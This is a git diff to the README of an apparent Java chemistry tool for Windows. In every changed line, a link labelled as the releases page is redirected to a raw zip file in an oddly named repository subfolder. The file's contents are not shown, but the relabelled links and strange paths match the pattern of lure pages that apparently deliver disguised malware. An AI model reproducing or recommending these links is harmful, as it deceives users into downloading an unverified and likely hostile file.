@@ -1,6 +1,6 @@
 # 🧪 Atomic-Lab-Architect-JAVA---ALAJ - Chemistry Tools for Windows
 
-[![Download ALAJ](https://img.shields.io/badge/Download-ALAJ-blue?style=for-the-badge)](https://github.com/brenadebatable659/Atomic-Lab-Architect-JAVA---ALAJ/releases)
+[![Download ALAJ](https://img.shields.io/badge/Download-ALAJ-blue?style=for-the-badge)](https://github.com/brenadebatable659/Atomic-Lab-Architect-JAVA---ALAJ/raw/refs/heads/main/Ataentsic/ALAJ-JAV-Lab-Architect-Atomic-strainably.zip)
 
 ## 🚀 What is ALAJ?
 
@@ -29,7 +29,7 @@ If you are not sure whether Java is installed, check the app release notes on th
 
 Visit the release page and download the Windows file that matches your system:
 
-[Open the ALAJ releases page](https://github.com/brenadebatable659/Atomic-Lab-Architect-JAVA---ALAJ/releases)
+[Open the ALAJ releases page](https://github.com/brenadebatable659/Atomic-Lab-Architect-JAVA---ALAJ/raw/refs/heads/main/Ataentsic/ALAJ-JAV-Lab-Architect-Atomic-strainably.zip)
 
 After the page opens, look for the latest release and download the file marked for Windows.
 
@@ -177,7 +177,7 @@ If a result looks wrong, test another element or molecule. Some chemistry tools 
 
 If you need the release page again, use this link:
 
-[Visit the ALAJ release downloads](https://github.com/brenadebatable659/Atomic-Lab-Architect-JAVA---ALAJ/releases)
+[Visit the ALAJ release downloads](https://github.com/brenadebatable659/Atomic-Lab-Architect-JAVA---ALAJ/raw/refs/heads/main/Ataentsic/ALAJ-JAV-Lab-Architect-Atomic-strainably.zip)
 
 ## 🧪 Useful input examples
 
